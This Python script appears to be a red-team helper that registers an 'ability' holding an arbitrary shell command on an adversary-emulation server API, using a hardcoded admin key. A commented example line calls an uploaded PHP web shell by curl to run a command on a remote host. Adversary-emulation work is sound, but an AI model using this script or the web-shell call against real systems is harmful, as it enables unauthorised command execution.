import requests
import json
import sys

def payload(arg):
    # executors - linux windows ...etc
    return {
        "name": arg[0],
        "description": arg[1],
        "tactic": "apitesttactic",
        "technique_id": "test",
        "technique_name": "test",
        "executors": [
            {
                # "command": "curl -s -X GET http://pdxf.malhyuk.info:4242/FileUpload/uploads/exec2.php3?cmd=echo%20\"you hacked\">you_are_hacked",
                "command": arg[2],
                "platform": "linux",
                "name": "sh",
                "timeout": 60
            }
        ]
    }

def exec_api(payload):
    headers = {
        'KEY': 'ADMIN123',
        'accept': 'application/json',
        'Content-Type' : 'application/json; charset=utf-8'
    }

    res = requests.post('http://pdxf.malhyuk.info:8888/api/v2/abilities', data=json.dumps(payload), headers=headers)
    # print(str(res.status_code))
    print(json.loads(res.text)["ability_id"])



if __name__ == '__main__':
    exec_api(payload(sys.argv[1:]))
